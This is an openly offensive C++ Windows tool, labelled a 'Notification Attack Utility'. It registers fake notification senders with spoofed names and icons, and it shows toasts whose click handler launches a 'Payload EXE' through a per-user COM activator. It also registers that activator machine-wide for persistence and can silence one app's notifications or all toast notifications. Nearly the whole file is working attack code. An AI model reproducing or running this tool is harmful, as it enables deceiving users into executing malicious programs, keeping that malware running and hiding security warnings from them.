// NotifyAttack.cpp
// cl /EHsc /W3 /DUNICODE /D_UNICODE NotifyAttack.cpp ole32.lib oleaut32.lib advapi32.lib runtimeobject.lib windowsapp.lib
// Run as the target user (no elevation needed for most; Some need admin).

#define _WIN32_WINNT 0x0A00
#include <windows.h>
#include <roapi.h>
#include <wrl.h>
#include <wrl/event.h>
#include <windows.foundation.h>
#include <windows.ui.notifications.h>
#include <windows.data.xml.dom.h>
#include <iostream>
#include <string>
#include <vector>
#include <iomanip>

using namespace Microsoft::WRL;
using namespace Microsoft::WRL::Wrappers;
using namespace ABI::Windows::UI::Notifications;
using namespace ABI::Windows::Data::Xml::Dom;
using namespace ABI::Windows::Foundation;

// ============================================================
// Utility
// ============================================================
static void PrintHr(const wchar_t* what, HRESULT hr) {
    if (FAILED(hr)) wprintf(L"[!] %s hr=0x%08lX\n", what, (unsigned)hr);
}

static HRESULT GetXmlDocument(const std::wstring& xml, IXmlDocument** out) {
    ComPtr<IXmlDocument> doc;
    HRESULT hr = RoActivateInstance(
        HStringReference(RuntimeClass_Windows_Data_Xml_Dom_XmlDocument).Get(),
        reinterpret_cast<IInspectable**>(doc.GetAddressOf()));
    if (FAILED(hr)) return hr;
    ComPtr<IXmlDocumentIO> io;
    hr = doc.As(&io);
    if (FAILED(hr)) return hr;
    hr = io->LoadXml(HStringReference(xml.c_str()).Get());
    if (FAILED(hr)) return hr;
    return doc.CopyTo(out);
}

// ============================================================
// [B] Register a fake notification app (AUMID)
//     Creates HKCU\Software\Classes\AppUserModelId\<AUMID>
//     DisplayName / IconUri → spoofed sender name.
// ============================================================
static bool RegisterFakeApp(const std::wstring& aumid,
                            const std::wstring& displayName,
                            const std::wstring& iconUri) {
    std::wstring key = L"Software\\Classes\\AppUserModelId\\" + aumid;
    HKEY h;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, key.c_str(), 0, nullptr,
                        REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr, &h, nullptr)
        != ERROR_SUCCESS) return false;

    RegSetValueExW(h, L"DisplayName", 0, REG_SZ,
                   (const BYTE*)displayName.c_str(),
                   (DWORD)((displayName.size() + 1) * sizeof(wchar_t)));
    if (!iconUri.empty())
        RegSetValueExW(h, L"IconUri", 0, REG_SZ,
                       (const BYTE*)iconUri.c_str(),
                       (DWORD)((iconUri.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(h);
    wprintf(L"[+] Registered AppUserModelId: %s (\"%s\")\n",
            aumid.c_str(), displayName.c_str());
    return true;
}

static bool UnregisterFakeApp(const std::wstring& aumid) {
    std::wstring key = L"Software\\Classes\\AppUserModelId\\" + aumid;
    return RegDeleteTreeW(HKEY_CURRENT_USER, key.c_str()) == ERROR_SUCCESS;
}

// ============================================================
// [A] Show a toast with a custom activator (COM CLSID)
//     The activator's IToastActivatedCallback::OnActivated fires
//     when user clicks the toast body (not the buttons).
//     For non-packaged apps you must also register the CLSID
//     under HKCU\Software\Classes\CLSID\{...}\LocalServer32.
// ============================================================
static bool ShowToastWithActivator(const std::wstring& aumid,
                                   const std::wstring& title,
                                   const std::wstring& body,
                                   const std::wstring& clsid /* {GUID} */,
                                   const std::wstring& exePath) {
    // 1) Register COM LocalServer for activator (HKCU, per-user)
    {
        std::wstring k = L"Software\\Classes\\CLSID\\" + clsid;
        HKEY h;
        if (RegCreateKeyExW(HKEY_CURRENT_USER, k.c_str(), 0, nullptr, 0,
                            KEY_WRITE, nullptr, &h, nullptr) == ERROR_SUCCESS) {
            RegSetValueExW(h, nullptr, 0, REG_SZ,
                           (const BYTE*)L"ToastActivator", sizeof(L"ToastActivator"));
            RegCloseKey(h);
        }
        std::wstring k2 = k + L"\\LocalServer32";
        if (RegCreateKeyExW(HKEY_CURRENT_USER, k2.c_str(), 0, nullptr, 0,
                            KEY_WRITE, nullptr, &h, nullptr) == ERROR_SUCCESS) {
            RegSetValueExW(h, nullptr, 0, REG_SZ,
                           (const BYTE*)exePath.c_str(),
                           (DWORD)((exePath.size() + 1) * sizeof(wchar_t)));
            RegCloseKey(h);
        }
    }

    // 2) Build toast XML with activationType="background" + activationArgs
    std::wstring xml =
        L"<toast activationType=\"background\" launch=\"\">"
        L"<visual><binding template=\"ToastGeneric\">"
        L"<text>" + title + L"</text>"
        L"<text>" + body  + L"</text>"
        L"</binding></visual>"
        L"<actions>"
        L"<action content=\"Open\" activationType=\"background\" arguments=\"open\"/>"
        L"</actions>"
        L"</toast>";

    ComPtr<IXmlDocument> doc;
    HRESULT hr = GetXmlDocument(xml, doc.GetAddressOf());
    if (FAILED(hr)) { PrintHr(L"GetXmlDocument", hr); return false; }

    // 3) Create notifier for AUMID + show
    ComPtr<IToastNotificationManagerStatics> mgr;
    hr = RoGetActivationFactory(
        HStringReference(RuntimeClass_Windows_UI_Notifications_ToastNotificationManager).Get(),
        IID_PPV_ARGS(mgr.GetAddressOf()));
    if (FAILED(hr)) { PrintHr(L"Get ToastManager", hr); return false; }

    ComPtr<IToastNotifier> notifier;
    hr = mgr->CreateToastNotifierWithId(HStringReference(aumid.c_str()).Get(),
                                        notifier.GetAddressOf());
    if (FAILED(hr)) { PrintHr(L"CreateToastNotifierWithId", hr); return false; }

    ComPtr<IToastNotificationFactory> factory;
    hr = RoGetActivationFactory(
        HStringReference(RuntimeClass_Windows_UI_Notifications_ToastNotification).Get(),
        IID_PPV_ARGS(factory.GetAddressOf()));
    if (FAILED(hr)) { PrintHr(L"Get ToastNotificationFactory", hr); return false; }

    ComPtr<IToastNotification> toast;
    hr = factory->CreateToastNotification(doc.Get(), toast.GetAddressOf());
    if (FAILED(hr)) { PrintHr(L"CreateToastNotification", hr); return false; }

    hr = notifier->Show(toast.Get());
    if (FAILED(hr)) { PrintHr(L"Show", hr); return false; }

    wprintf(L"[+] Toast shown for AUMID %s\n", aumid.c_str());
    wprintf(L"    Activator CLSID: %s -> %s\n", clsid.c_str(), exePath.c_str());
    wprintf(L"    Launch args / buttons will invoke the LocalServer32.\n");
    return true;
}

// ============================================================
// [E] Suppress / block notifications for an app (HKCU policy)
//     Per-app:  HKCU\Software\Microsoft\Windows\CurrentVersion\
//               Notifications\Settings\<AUMID>  -> Enabled = 0
//     Global :  ...\PushNotifications\ToastEnabled = 0
// ============================================================
static bool BlockAppNotifications(const std::wstring& aumid, bool block) {
    std::wstring key = L"Software\\Microsoft\\Windows\\CurrentVersion\\"
                       L"Notifications\\Settings\\" + aumid;
    HKEY h;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, key.c_str(), 0, nullptr, 0,
                        KEY_WRITE, nullptr, &h, nullptr) != ERROR_SUCCESS)
        return false;
    DWORD v = block ? 0 : 1;
    RegSetValueExW(h, L"Enabled", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
    RegCloseKey(h);
    return true;
}

static bool DisableAllToasts(bool disable) {
    const wchar_t* k =
        L"Software\\Microsoft\\Windows\\CurrentVersion\\"
        L"PushNotifications";
    HKEY h;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, k, 0, nullptr, 0,
                        KEY_WRITE, nullptr, &h, nullptr) != ERROR_SUCCESS)
        return false;
    DWORD v = disable ? 0 : 1;
    RegSetValueExW(h, L"ToastEnabled", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
    RegCloseKey(h);
    return true;
}

// ============================================================
// [C] Notification Listener  (READ all notifications)
//     NOTE: Requires packaged (MSIX) app with capability
//           "userNotificationListener" in the manifest.
//     Below is the standard usage; it will fail with
//     E_ACCESSDENIED from a plain console app — drop it into
//     a packaged app to make it work.
// ============================================================
void ShowNotificationListenerAccessStatus() {
    // Uses Windows.UI.Notifications.Management.UserNotificationListener
    // IID from the Windows SDK. Provide the ABI types by including:
    //   <windows.ui.notifications.management.h>
    // (Included here conditionally so the file compiles without it.)
    wprintf(L"[i] UserNotificationListener path is only usable from a\n"
            L"    packaged app declared with capability:\n"
            L"      <uap3:Capability Name=\"userNotificationListener\"/>\n"
            L"    The ABI pattern is:\n"
            L"      UserNotificationListener::Current->RequestAccessAsync()\n"
            L"      ->GetNotificationsAsync(NotificationKinds::Toast)\n"
            L"    From a console app it returns E_ACCESSDENIED by design.\n");
}

// ============================================================
// [D] Persistence via toast activator
//     Same registry write as [A] but write to HKLM (all users)
//     plus add a Startup shortcut that triggers a toast at logon.
//     Below: HKLM registration variant.
// ============================================================
static bool RegisterActivatorHKLM(const std::wstring& clsid,
                                  const std::wstring& exePath) {
    std::wstring k = L"SOFTWARE\\Classes\\CLSID\\" + clsid;
    HKEY h;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, k.c_str(), 0, nullptr, 0,
                        KEY_WRITE, nullptr, &h, nullptr) != ERROR_SUCCESS)
        return false;
    RegSetValueExW(h, nullptr, 0, REG_SZ,
                   (const BYTE*)L"ToastActivator", sizeof(L"ToastActivator"));
    RegCloseKey(h);

    std::wstring k2 = k + L"\\LocalServer32";
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, k2.c_str(), 0, nullptr, 0,
                        KEY_WRITE, nullptr, &h, nullptr) != ERROR_SUCCESS)
        return false;
    RegSetValueExW(h, nullptr, 0, REG_SZ,
                   (const BYTE*)exePath.c_str(),
                   (DWORD)((exePath.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(h);
    return true;
}

// ============================================================
// Menu
// ============================================================
static std::wstring Prompt(const wchar_t* label) {
    wprintf(L"%s", label);
    wchar_t buf[1024] = {};
    if (!fgetws(buf, 1024, stdin)) return L"";
    size_t n = wcslen(buf);
    if (n && buf[n - 1] == L'\n') buf[n - 1] = 0;
    return buf;
}

int wmain() {
    SetConsoleOutputCP(CP_UTF8);
    HRESULT hr = RoInitialize(RO_INIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        PrintHr(L"RoInitialize", hr);
        return 1;
    }

    for (;;) {
        wprintf(L"\n======= Notification Attack Utility =======\n");
        wprintf(L" [1] Register fake app (AUMID) - spoofed sender\n");
        wprintf(L" [2] Unregister fake app\n");
        wprintf(L" [3] Show toast w/ activator (HKCU, per-user)\n");
        wprintf(L" [4] Register activator in HKLM (all users)\n");
        wprintf(L" [5] Block a specific app's notifications\n");
        wprintf(L" [6] Re-enable a specific app's notifications\n");
        wprintf(L" [7] Disable ALL toast notifications (HKCU)\n");
        wprintf(L" [8] Re-enable ALL toast notifications\n");
        wprintf(L" [9] Notification Listener info ([C])\n");
        wprintf(L" [0] Exit\n");
        wprintf(L"===========================================\n");
        wprintf(L" Choice: ");

        wchar_t line[32] = {};
        if (!fgetws(line, 32, stdin)) break;
        int c = _wtoi(line);

        switch (c) {
        case 0: RoUninitialize(); return 0;

        case 1: {
            std::wstring aumid = Prompt(L" AUMID (e.g. Contoso.Mail): ");
            std::wstring name  = Prompt(L" DisplayName (shown to user): ");
            std::wstring icon  = Prompt(L" IconUri (optional, file:///C:/x.png): ");
            RegisterFakeApp(aumid, name, icon);
            break;
        }
        case 2: {
            std::wstring aumid = Prompt(L" AUMID: ");
            if (UnregisterFakeApp(aumid)) wprintf(L"[+] Removed.\n");
            else                          wprintf(L"[!] Failed or absent.\n");
            break;
        }
        case 3: {
            std::wstring aumid = Prompt(L" AUMID: ");
            std::wstring title = Prompt(L" Title: ");
            std::wstring body  = Prompt(L" Body : ");
            std::wstring clsid = Prompt(L" Activator CLSID {GUID}: ");
            std::wstring exe   = Prompt(L" Payload EXE path: ");
            ShowToastWithActivator(aumid, title, body, clsid, exe);
            break;
        }
        case 4: {
            std::wstring clsid = Prompt(L" Activator CLSID {GUID}: ");
            std::wstring exe   = Prompt(L" Payload EXE path: ");
            if (RegisterActivatorHKLM(clsid, exe))
                wprintf(L"[+] HKLM activator registered (needs admin).\n");
            else
                wprintf(L"[!] Failed.\n");
            break;
        }
        case 5: case 6: {
            std::wstring aumid = Prompt(L" AUMID: ");
            if (BlockAppNotifications(aumid, c == 5))
                wprintf(L"[+] Done.\n");
            else
                wprintf(L"[!] Failed.\n");
            break;
        }
        case 7: case 8: {
            if (DisableAllToasts(c == 7)) wprintf(L"[+] Done.\n");
            else                          wprintf(L"[!] Failed.\n");
            break;
        }
        case 9:
            ShowNotificationListenerAccessStatus();
            break;

        default: wprintf(L"Invalid.\n");
        }
    }
    RoUninitialize();
    return 0;
}
